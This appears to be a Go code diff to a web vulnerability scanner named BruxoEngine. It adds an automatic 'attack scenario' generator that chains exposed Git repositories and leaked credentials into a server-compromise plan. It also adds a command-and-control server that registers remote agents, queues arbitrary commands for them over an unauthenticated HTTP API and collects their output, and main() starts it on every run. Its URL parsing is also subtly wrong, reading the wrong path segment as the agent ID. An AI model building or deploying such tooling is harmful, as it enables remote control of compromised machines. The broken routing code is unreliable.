@@ -57,6 +57,11 @@ type BruxoEngine struct {
 	baseStatusCode int
 	baseHash       uint32
 	chatAnalysis   string
+	attackScenarios []AttackScenario
+
+	// C2 Fields
+	c2Agents map[string]*Agent
+	c2Mutex  sync.RWMutex
 }
 
 type Config struct {
@@ -85,6 +90,30 @@ type AttackStep struct {
 }
 
 type AttackFlow []AttackStep
+
+type AttackScenario struct {
+	Objective          string   `json:"Objective"`
+	Steps              []string `json:"Steps"`
+	EstimatedTime      string   `json:"EstimatedTime"`
+	SuccessProbability string   `json:"SuccessProbability"`
+}
+
+type Agent struct {
+	ID        string    `json:"id"`
+	IPAddress string    `json:"ip_address"`
+	Hostname  string    `json:"hostname"`
+	OS        string    `json:"os"`
+	LastSeen  time.Time `json:"last_seen"`
+	Status    string    `json:"status"`
+	taskQueue chan Task `json:"-"` // Not serialized
+}
+
+type Task struct {
+	ID      string `json:"id"`
+	Command string `json:"command"`
+	Result  string `json:"result"`
+	Status  string `json:"status"` // e.g., "pending", "completed", "error"
+}
 
 type Vulnerability struct {
 	Name               string     `json:"Name"`
@@ -197,6 +226,7 @@ func NewBruxoEngine(config *Config) *BruxoEngine {
 			WriteTimeout:        time.Duration(config.Timeout) * time.Second,
 			MaxIdleConnDuration: 90 * time.Second,
 		},
+		c2Agents: make(map[string]*Agent),
 	}
 
 	if config.FindHidden {
@@ -338,6 +368,8 @@ func (b *BruxoEngine) Scan() error {
 			}
 		}
 	}
+
+	b.generateAttackScenarios()
 
 	if b.config.RedTeamToolURL != "" {
 		for i := range b.results {
@@ -573,12 +605,14 @@ func (b *BruxoEngine) generateHTMLReport() error {
 		GeneratedAt  string
 		TotalFound   int
 		ChatAnalysis string
+		AttackScenarios []AttackScenario
 	}{
 		Results:      b.results,
 		TargetURL:    b.config.TargetURL,
 		GeneratedAt:  time.Now().Format(time.RFC1123),
 		TotalFound:   len(b.results),
 		ChatAnalysis: b.chatAnalysis,
+		AttackScenarios: b.attackScenarios,
 	}
 
 	return tmpl.Execute(file, data)
@@ -785,6 +819,31 @@ func (b *BruxoEngine) collectEvidence(body []byte, sourceURL string) []Evidence 
 		}
 	}
 	return evidences
+}
+
+func (b *BruxoEngine) generateAttackScenarios() {
+	// Exemplo de lógica para gerar um cenário de ataque
+	var hasExposedGit, hasSensitiveFile bool
+	for _, result := range b.results {
+		for _, vuln := range result.Vulnerabilities {
+			if vuln.Name == "Exposed Git Repository" {
+				hasExposedGit = true
+			}
+			if vuln.Name == "Sensitive File Exposed" {
+				hasSensitiveFile = true
+			}
+		}
+	}
+
+	if hasExposedGit && hasSensitiveFile {
+		scenario := AttackScenario{
+			Objective:          "Compromise Server via Exposed Credentials",
+			Steps:              []string{"Find Exposed Git Repository", "Extract Sensitive Files (e.g., .env)", "Use Credentials to Access Services", "Achieve Initial Foothold"},
+			EstimatedTime:      "1-2 hours",
+			SuccessProbability: "90%",
+		}
+		b.attackScenarios = append(b.attackScenarios, scenario)
+	}
 }
 
 func (b *BruxoEngine) integrateWithRedTeamTool(result *ScanResult) {
@@ -1026,8 +1085,178 @@ func main() {
 
 	printBanner(config)
 	engine := NewBruxoEngine(&config)
+	go engine.startC2Server()
 	if err := engine.Scan(); err != nil {
 		engine.logger.Error("An error occurred during the scan: %v", err)
+	}
+}
+
+func (b *BruxoEngine) startC2Server() {
+	b.logger.Info("Starting C2 server on :8080")
+	http.HandleFunc("/c2/checkin", b.handleCheckin)
+	http.HandleFunc("/c2/tasks/", b.handleGetTask)
+	http.HandleFunc("/c2/results/", b.handlePostResult)
+	http.HandleFunc("/api/agents", b.handleGetAgents)
+	http.HandleFunc("/api/agents/", b.handlePostTask)
+
+	if err := http.ListenAndServe(":8080", nil); err != nil {
+		b.logger.Error("C2 server failed: %v", err)
+	}
+}
+
+func (b *BruxoEngine) handleCheckin(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
+		return
+	}
+
+	var agentData struct {
+		Hostname string `json:"hostname"`
+		OS       string `json:"os"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&agentData); err != nil {
+		http.Error(w, "Invalid request body", http.StatusBadRequest)
+		return
+	}
+
+	// Gerar um ID único para o agente
+	agentID := fmt.Sprintf("agent-%d", time.Now().UnixNano())
+
+	newAgent := &Agent{
+		ID:        agentID,
+		IPAddress: r.RemoteAddr,
+		Hostname:  agentData.Hostname,
+		OS:        agentData.OS,
+		LastSeen:  time.Now(),
+		Status:    "active",
+		taskQueue: make(chan Task, 10), // Buffer para 10 tarefas
+	}
+
+	b.c2Mutex.Lock()
+	b.c2Agents[agentID] = newAgent
+	b.c2Mutex.Unlock()
+
+	b.logger.Info("New agent checked in: %s from %s (%s)", agentID, newAgent.IPAddress, newAgent.OS)
+
+	w.Header().Set("Content-Type", "application/json")
+	w.WriteHeader(http.StatusCreated)
+	json.NewEncoder(w).Encode(map[string]string{"id": agentID})
+}
+
+func (b *BruxoEngine) handleGetTask(w http.ResponseWriter, r *http.Request) {
+	parts := strings.Split(r.URL.Path, "/")
+	if len(parts) < 4 {
+		http.Error(w, "Invalid URL path", http.StatusBadRequest)
+		return
+	}
+	agentID := parts[2]
+
+	b.c2Mutex.RLock()
+	agent, ok := b.c2Agents[agentID]
+	b.c2Mutex.RUnlock()
+
+	if !ok {
+		http.Error(w, "Agent not found", http.StatusNotFound)
+		return
+	}
+
+	agent.LastSeen = time.Now()
+	agent.Status = "active"
+
+	select {
+	case task := <-agent.taskQueue:
+		b.logger.Info("Sending task %s to agent %s", task.ID, agentID)
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(task)
+	case <-time.After(30 * time.Second): // Timeout para a resposta
+		w.WriteHeader(http.StatusNoContent)
+	}
+}
+
+func (b *BruxoEngine) handlePostResult(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
+		return
+	}
+
+	parts := strings.Split(r.URL.Path, "/")
+	if len(parts) < 4 {
+		http.Error(w, "Invalid URL path", http.StatusBadRequest)
+		return
+	}
+	agentID := parts[2]
+
+	var data struct {
+		TaskID string `json:"task_id"`
+		Result string `json:"result"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
+		http.Error(w, "Invalid request body", http.StatusBadRequest)
+		return
+	}
+
+	b.logger.Info("Result received from agent %s for task %s:\n%s", agentID, data.TaskID, data.Result)
+
+	w.WriteHeader(http.StatusOK)
+	json.NewEncoder(w).Encode(map[string]string{"status": "result processed"})
+}
+
+func (b *BruxoEngine) handleGetAgents(w http.ResponseWriter, r *http.Request) {
+	// Lógica para o painel obter a lista de agentes
+	b.c2Mutex.RLock()
+	defer b.c2Mutex.RUnlock()
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(b.c2Agents)
+}
+
+func (b *BruxoEngine) handlePostTask(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
+		return
+	}
+
+	parts := strings.Split(r.URL.Path, "/")
+	if len(parts) < 4 {
+		http.Error(w, "Invalid URL path", http.StatusBadRequest)
+		return
+	}
+	agentID := parts[2]
+
+	var data struct {
+		Command string `json:"command"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
+		http.Error(w, "Invalid request body", http.StatusBadRequest)
+		return
+	}
+
+	b.c2Mutex.RLock()
+	agent, ok := b.c2Agents[agentID]
+	b.c2Mutex.RUnlock()
+
+	if !ok {
+		http.Error(w, "Agent not found", http.StatusNotFound)
+		return
+	}
+
+	task := Task{
+		ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
+		Command: data.Command,
+		Status:  "pending",
+	}
+
+	select {
+	case agent.taskQueue <- task:
+		b.logger.Info("Task %s enqueued for agent %s: %s", task.ID, agentID, task.Command)
+		w.Header().Set("Content-Type", "application/json")
+		w.WriteHeader(http.StatusAccepted)
+		json.NewEncoder(w).Encode(task)
+	default:
+		b.logger.Error("Task queue for agent %s is full", agentID)
+		http.Error(w, "Task queue is full", http.StatusServiceUnavailable)
 	}
 }
 
